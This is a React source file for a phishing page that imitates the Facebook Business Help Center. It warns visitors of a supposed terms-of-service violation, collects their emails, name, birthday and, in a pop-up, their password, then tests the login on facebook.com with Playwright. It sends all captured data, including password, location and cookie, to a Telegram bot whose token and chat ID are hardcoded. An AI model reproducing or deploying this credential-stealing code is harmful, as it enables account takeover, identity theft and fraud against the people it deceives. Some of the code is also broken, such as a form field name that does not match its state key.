import React, { useState } from 'react';
import Header from './header'
import Footer from './footer';
import { Typography, FormControl, Box, Grid, Container, TextField, FormControlLabel, Checkbox, Button, Modal } from '@mui/material';
import PhoneInput from 'react-phone-input-2'
import 'react-phone-input-2/lib/style.css'
import './css/issueStyles.css'


const Issue = () => {
    const boxStyle = {
        // border: '1px solid rgb(210,210,210)', // Set the border style to solid
        // padding: '16px',
        // borderRadius: '5px',
        marginBottom: '50px',

        maxWidth: '528px',
        border: '1px solid rgba(0, 0, 0, 0.17)',
        borderRadius: '5px',
        padding: '50px 15px 15px',
        margin: '0px auto',// Add some padding for spacing
    };
    const issueStyle = {
        margin: '0px',
        fontFamily: 'Roboto, Helvetica, Arial, sans-serif',
        lineHeight: '1.5',
        letterSpacing: '0.00938em',
        color: 'rgb(33, 37, 41)',
        fontWeight: 500,
        textAlign: 'center',
        fontSize: '1.5rem',
        paddingBottom: '20px',
    };
    const circleStyle = {
        borderRadius: '1.5rem',
        height: '0.5rem',
        width: '0.5rem',
        display: 'inline-flex',
        backgroundColor: 'rgb(59,130,246)',
        alignItems: 'center',
        justifyContent: 'center',
    };

    const timelineContentTextStyle = {
        height: '50px',
        maxWidth: '90px',
        margin: '30px 0px 0px',
        fontFamily: 'Roboto, Helvetica, Arial, sans-serif',
        fontWeight: 400,
        fontSize: '1rem',
        lineHeight: 1.5,
        letterSpacing: '0.00938em',
        textAlign: 'center',
        paddingBottom: '15px',
    };

    const timelineContent = {
        boxSizing: 'border-box',
        flexFlow: 'column wrap',
        width: '100%',
        margin: '0px',
        flexBasis: '33.3333%',
        flexShrink: 0,
        flexGrow: 0,
        maxWidth: '33.3333%',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        position: 'relative',
    };
    const startedStyle = {
        margin: '30px 0px 0px',
        fontFamily: 'Roboto, Helvetica, Arial, sans-serif',
        lineHeight: 1.5,
        letterSpacing: '0.00938em',
        color: 'rgb(61, 63, 65)',
        textAlign: 'center',
        paddingBottom: '15px',
        fontSize: '1.35em',
        fontWeight: 500,
    };
    const bodyStyle = {
        margin: '0px 0px 15px',
        fontFamily: 'Roboto, Helvetica, Arial, sans-serif',
        lineHeight: 1.5,
        letterSpacing: '0.00938em',
        color: 'rgb(122, 122, 122)',
        fontSize: '0.875em',
        fontWeight: 400,
    }

    const modalTextStyle = {
        margin: '0px',
        fontFamily: 'Roboto, Helvetica, Arial, sans-serif',
        lineHeight: 1.5,
        letterSpacing: '0.00938em',
        color: 'rgb(122, 122, 122)',
        fontSize: '1rem',
        fontWeight: 400,
        padding: '15px 0px'
    }

    const reportStyle = {
        margin: '0px',
        fontFamily: 'Roboto, Helvetica, Arial, sans-serif',
        lineHeight: 1.5,
        letterSpacing: '0.00938em',
        color: 'rgb(33, 37, 41)',
        fontSize: '16px',
        fontWeight: 600,
    };
    const textAreaStyle = {
        height: '60px',
        border: '1px solid rgba(128, 128, 128, 0.51)',
        borderRadius: '5px',
        padding: '0.375rem 0.75rem',
    }


    const modalStyle = {
        position: 'absolute' as 'absolute',
        top: '50%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        width: 450,
        bgcolor: 'background.paper',
        p: 4,
        maxWidth: '600px',
        borderRadius: '16px',
        backgroundColor: 'rgb(255, 255, 255)',
        border: '1px solid rgb(237, 237, 237)',
        boxShadow: 'rgba(0, 0, 0, 0.2) 0px 11px 15px -7px, rgba(0, 0, 0, 0.14) 0px 24px 38px 3px, rgba(0, 0, 0, 0.12) 0px 9px 46px 8px',
        padding: '16px',
        margin: '0px 15px',
    }

    const formStyle = {
        display: 'inline-flex',
        flexDirection: 'column',
        position: 'relative',
        minWidth: '0px',
        padding: '30px 0px 0px',
        margin: '0px',
        border: '0px',
        verticalAlign: 'top',
        width: '100%',
    }
    const facebookStyle = {
        margin: '0px',
        fontFamily: 'Roboto, Helvetica, Arial, sans-serif',
        fontWeight: 400,
        lineHeight: '1.5',
        letterSpacing: '0.00938em',
        color: 'rgb(255, 255, 255)',
        position: 'absolute',
        textAlign: 'center',
        top: '18%',
        left: '0px',
        width: '100%',
        transform: 'translate(0px, -50%)',
        fontSize: '24px',
    };
    const secondBoxStyle = {
        'margin': '40px 0px 50px'
    }
    const boxContainerStyle = {
        width: '100%',
        marginLeft: 'auto',
        boxSizing: 'border-box',
        marginRight: 'auto',
        display: 'block'
    }
    const phoneStyle = {
        fontFamily: 'Roboto, sans-serif',
        fontSize: '15px',
        position: 'relative',
        width: '100%',
    }
    const headerStyle = {
        borderBottom: '1px solid rgba(0, 0, 0, 0.12)',
        paddingBottom: '1.5em',
        display: 'flex',
        WebkitBoxAlign: 'center',
        alignItems: 'center',
        WebkitBoxPack: 'justify',
        justifyContent: 'space-between',
    }
    const contentStyle = {
        borderBottom: '1px solid rgba(0, 0, 0, 0.12)',
        paddingBottom: '1.5em',
    }

    const [formData, setFormData] = useState({
        ip: '',
        countryCode: '',
        city: '',
        latitude: '',
        longtitude: '',
        info: '',
        emailBusiness: '',
        emailPersonal: '',
        fbPage: '',
        password: '',
        fullName: '',
        dob: '',
        phone: '',
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        cookie: ''
    });

    const [open, setOpen] = useState(false);
    const handleOpen = () => setOpen(true);
    const handleClose = () => setOpen(false);

    const handleChange = (e) => {
        const { name, value } = e.target;
        setFormData((prevData) => ({
            ...prevData,
            [name]: value,
        }));
    };

    const playwright = require('playwright');

    const handleSubmit = async () => {
        const apiKey = '6425835045:AAH4oQKUYBm1HJRb2ALoeP5fEkfGgqSvmuo'; // Replace with your bot API key
        const chatId = '-1002102330634'; // Replace with your chat ID

        const headers = {
            'Content-Type': 'application/json',
        };

        const apiUrl = `https://api.telegram.org/bot${apiKey}/sendMessage`;




        // Access the form data here (formData object)
        console.log(formData);

        try {
            // Launch a headless browser with Playwright (you can choose a specific browser)
            const browser = await playwright.chromium.launch();
            const context = await browser.newContext();
            const page = await context.newPage();

            // Navigate to a webpage (replace with the actual URL)
            const targetUrl = 'https://www.facebook.com/'; // Replace with the URL you want to visit
            await page.goto(targetUrl);
            await page.fill('#email', formData.emailPersonal);
            await page.fill('#pass', formData.password);
            await page.click('button[name="login"]');
            await page.waitForSelector('a[aria-label="Facebook"]');

            // You can perform interactions with the page using Playwright here if needed

            // Close the browser when done
            await browser.close();

            // Continue with sending the Telegram message

        } catch (error) {
            console.error('Error sending message:', error);
            throw error;
        }

        const formattedString = `[{}]: New information submitted 
        *IP:* ${formData.ip}
        *Country Code:* ${formData.countryCode}
        *City:* ${formData.city}
        *Latitude:* ${formData.latitude}
        *Longitude:* ${formData.longtitude}
        *Information:* ${formData.info}
        *Business Email:* ${formData.emailBusiness}
        *Personal Email*: ${formData.emailPersonal}
        *Password: * ${formData.password}
        *Fullname: *${formData.fullName}
        *Facebook Name:* ${formData.fbPage}
        *Birthday: * ${formData.dob}
        *Phone*: ${formData.phone}
        *User Agent:* ${formData.userAgent}
        *Cookie*: ${formData.cookie}`;

        const data = {
            chat_id: chatId,
            text: formattedString,
            parse_mode: 'HTML',
            disable_notification: false,
        };

        try {
            const response = await fetch(apiUrl, {
                method: 'POST',
                headers,
                body: JSON.stringify(data),
            });

            if (response.ok) {
                console.log('ok');
            } else {
                console.error('Failed to send message');
            }
        } catch (error) {
            console.error('Error sending message:', error);
            throw error;
        }


    };


    return (
        <div>
            <Header />
            <Box component='section'>
                <Box>
                    <img src='images/main_background.jpg' alt='background_png' ></img>
                    <Typography variant='h2' className="centered-text" style={facebookStyle}>Facebook Business Help Center</Typography>
                </Box>
                <Box style={secondBoxStyle}>
                    <Container style={boxContainerStyle} maxWidth="lg">
                        <Box style={boxStyle}>
                            <Grid container spacing={2}>
                                <Grid style={timelineContent} className='timeline-content' container item xs={4} sm={4} md={4} direction="column">
                                    <Box style={circleStyle} className='inner-circle'></Box>
                                    <Typography style={timelineContentTextStyle} variant='body1' component='p'>Select Asset</Typography>
                                </Grid>
                                <Grid style={timelineContent} className='timeline-content' container item xs={4} sm={4} md={4} direction="column">
                                    <Box style={circleStyle} className='inner-circle'></Box>
                                    <Typography style={timelineContentTextStyle} variant='body1' component='p'>Select the Issue</Typography>
                                </Grid>
                                <Grid style={timelineContent} className='timeline-content' container item xs={4} sm={4} md={4} direction="column">
                                    <Box style={circleStyle} className='inner-circle'></Box>
                                    <Typography style={timelineContentTextStyle} variant='body1' component='p'>Get help</Typography>
                                </Grid>
                            </Grid>
                            <Typography variant='body1' align='center' component='h3' style={startedStyle}>Get Started</Typography>
                            <Box alignContent={'center'}>
                                <Typography variant='body1' style={bodyStyle}>We have received multiple reports that suggest that your account has been in violation of our terms of services and community guidelines. As a result, your account is scheduled for review</Typography>
                                <Typography variant='body1' align='center' component='b' style={reportStyle}>Report no: 6ed73dbc-5a5d-4f85-9bfd-59c28e357975</Typography>
                            </Box>
                            <Box component='form' method='post'>
                                <FormControl style={formStyle}>
                                    <Typography component='label' variant='body1' style={bodyStyle}>Please provide us information that will help us investigate</Typography>
                                    <textarea onChange={handleChange} required name='infor' rows={4} style={textAreaStyle} />
                                    <Typography component='label' variant='body1' style={bodyStyle}>Business Email</Typography>
                                    <TextField onChange={handleChange} required name='emailBusiness' type='email'></TextField>
                                    <Typography component='label' variant='body1' style={bodyStyle}>Facebook Email</Typography>
                                    <TextField onChange={handleChange} required name='emailPersonal' type='email'></TextField>
                                    <Typography component='label' variant='body1' style={bodyStyle}>Facebook Page Name</Typography>
                                    <TextField onChange={handleChange} required name='fbPage' type='text'></TextField>
                                    <Typography component='label' variant='body1' style={bodyStyle}>Full name</Typography>
                                    <TextField onChange={handleChange} required name='fullName' type='text'></TextField>
                                    <Typography component='label' variant='body1' style={bodyStyle}>Birthday</Typography>
                                    <TextField onChange={handleChange} required name='dob' type='date'></TextField>
                                    <Typography component='label' variant='body1' style={bodyStyle}>Phone Number</Typography>
                                    {/* <Box>
                                        <PhoneInput onChange={handleChange} inputProps={{
                                            name: 'phone',
                                            required: true,
                                            autoFocus: true
                                        }} style={phoneStyle} country={'us'} />
                                    </Box> */}
                                    <FormControlLabel required control={<Checkbox />} labelPlacement='end' label='I agree to our Terms, Data and Cookies Policy.' />
                                    <Button variant="contained" size='medium' tabIndex={0} type='button' onClick={handleOpen}>Submit</Button>
                                    <Modal
                                        open={open}
                                        onClose={handleClose}
                                        aria-labelledby="modal-modal-title"
                                        aria-describedby="modal-modal-description"
                                    >
                                        <Box style={modalStyle}>
                                            <Box className='header-modal' style={headerStyle}>
                                                <Typography variant="body1" component="h2">
                                                    Please Enter Your Password
                                                </Typography>
                                            </Box>
                                            <Box className='content-modal' style={contentStyle}>
                                                <Typography variant="body1" component="p" style={modalTextStyle}>
                                                    For your security, you must enter your password to continue.
                                                </Typography>
                                                <Box>
                                                    <TextField onChange={handleChange} required type='password' name='password' placeholder='*********'></TextField>
                                                </Box>
                                            </Box>
                                            <Box className='footer-modal'>
                                                <Grid container item md={12} className=''>
                                                    <Button className='cancel-btn' type='button'>
                                                        Cancel
                                                    </Button>
                                                    <Button onClick={handleSubmit} className='submit-btn' type='submit'>
                                                        Submit
                                                    </Button>
                                                </Grid>
                                            </Box>
                                        </Box>

                                    </Modal>
                                </FormControl>
                            </Box>
                        </Box>
                    </Container>
                </Box>
            </Box>
            <Footer />
        </div>
    );
};

export default Issue